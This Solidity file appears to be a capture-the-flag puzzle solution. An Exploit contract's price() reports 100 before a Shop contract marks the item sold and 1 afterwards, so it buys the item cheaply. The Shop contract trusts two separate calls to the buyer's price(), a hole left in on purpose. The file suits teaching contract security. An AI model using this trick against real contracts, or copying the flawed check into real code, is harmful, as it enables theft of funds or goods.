// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Buyer {
    function price() external view returns (uint256);
}

contract Exploit is Buyer {
    Shop victim;

    constructor(Shop _victim) {
        victim = _victim;
    }

    function buy() external {
        victim.buy();
    }

    function price() external view returns (uint256) {
        return victim.isSold() ? 1 : 100;
    }
}

contract Shop {
    uint256 public price = 100;
    bool public isSold;

    function buy() public {
        Buyer _buyer = Buyer(msg.sender);

        if (_buyer.price() >= price && !isSold) {
            isSold = true;
            price = _buyer.price();
        }
    }
}
